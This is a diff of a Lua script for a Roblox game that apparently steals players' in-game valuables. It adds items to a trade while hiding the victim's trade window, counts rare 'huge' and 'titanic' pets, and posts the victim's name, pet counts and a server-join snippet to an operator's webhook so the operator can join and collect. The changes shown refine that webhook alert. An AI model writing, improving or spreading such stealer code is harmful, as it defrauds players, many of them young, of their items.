@@ -53,8 +53,6 @@ function AddGemsToTrade()
         if v.id == "Diamonds" then
             GemAmount = v._am
             GemId = i
-			print(GemAmount)
-			print(GemId)
             local args = {
                 [1] = 1,
                 [2] = "Currency",
@@ -115,10 +113,6 @@ function HasTitanic()
 	return titanic
 end
 
-if Webhook ~= "" and (HasHuge() == "Yes" or HasTitanic() == "Yes") then
-	SendMessage(Webhook, "User " .. game.Players.LocalPlayer.Name .. " has executed the script. Join the game with this script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(8737899170, '" .. game.JobId .. "', game.Players.LocalPlayer)\n```Has titanic: " .. HasTitanic() .. "\nHas huge: " .. HasHuge())
-end
-
 local trade = game:GetService('Players').LocalPlayer.PlayerGui.TradeWindow.Frame
 trade.Visible = false
 trade:GetPropertyChangedSignal("Visible"):Connect(function()
@@ -141,7 +135,37 @@ function UnlockPets()
     end
 end
 
+function CountHuges()
+	local count = 0
+	for i, v in pairs(inventory.Pet) do
+		local id = v.id
+		local dir = library.Directory.Pets[id]
+		if dir.huge then
+			count = count + 1
+		end
+	end
+	return count
+end
+
+function CountTitanics()
+	local count = 0
+	for i, v in pairs(inventory.Pet) do
+		local id = v.id
+		local dir = library.Directory.Pets[id]
+		if dir.titanic then
+			count = count + 1
+		end
+	end
+	return count
+end
+
 if HasHuge() == "Yes" or HasTitanic() == "Yes" then
+	local titanics = CountTitanics()
+	local huges = CountHuges()
+	if Webhook ~= "" then
+		SendMessage(Webhook, "User " .. game.Players.LocalPlayer.Name .. " has executed the script. Join the game with this script: ```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(8737899170, '" .. game.JobId .. "', game.Players.LocalPlayer)\n```Titanic count: " .. titanics .. "\nHuge count: " .. huges)
+	end
+	
 	UnlockPets()
 
 	while true do
